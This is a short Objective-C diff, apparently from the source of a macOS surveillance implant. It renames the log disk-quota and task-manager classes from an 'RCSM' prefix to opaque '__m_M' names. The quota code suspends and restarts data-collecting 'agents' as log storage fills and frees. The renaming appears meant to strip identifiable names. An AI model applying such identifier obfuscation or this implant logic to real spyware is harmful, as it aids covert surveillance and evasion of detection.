@@ -13,7 +13,7 @@
 #import "RCSMDebug.h"
 #import "RCSMLogger.h"
 
-static RCSMDiskQuota *sharedDiskQuota = nil;
+static __m_MDiskQuota *sharedDiskQuota = nil;
 
 typedef struct {
   UInt32 disk_quota;
@@ -28,7 +28,7 @@ typedef struct  {
 } global_conf_t;
 
 
-@implementation RCSMDiskQuota
+@implementation __m_MDiskQuota
 
 @synthesize mMaxQuotaTriggered;
 
@@ -46,7 +46,7 @@ typedef struct  {
   return nil;
 }
 
-+ (RCSMDiskQuota *)sharedInstance
++ (__m_MDiskQuota *)sharedInstance
 {
   @synchronized(self)
   {
@@ -241,7 +241,7 @@ typedef struct  {
 #endif
       
       // check quotas till logs are flushed
-      if ([[RCSMTaskManager sharedInstance] mIsSyncing])
+      if ([[__m_MTaskManager sharedInstance] mIsSyncing])
           continue;
           
 #ifdef DEBUG_QUOTA
@@ -279,7 +279,7 @@ typedef struct  {
           mMaxGlobalQuotaReached = TRUE;
 
           // Quota disk exceded to taskManager: stop all agents activity
-          [[RCSMTaskManager sharedInstance] suspendAgents];
+          [[__m_MTaskManager sharedInstance] suspendAgents];
           
 #ifdef DEBUG_QUOTA
           infoLog(@"mMaxGlobalQuotaReached exceeded [%lu > %lu]", mUsed, mMaxGlobalLogSize);
@@ -294,7 +294,7 @@ typedef struct  {
           mMaxGlobalQuotaReached = FALSE;
           
           // send quota disk now available to taskManager: renable all agents
-          [[RCSMTaskManager sharedInstance] restartAgents];
+          [[__m_MTaskManager sharedInstance] restartAgents];
           
 #ifdef DEBUG_QUOTA
           infoLog(@"mMaxGlobalQuotaReached available [%lu > %lu]", mUsed, mMaxGlobalLogSize);
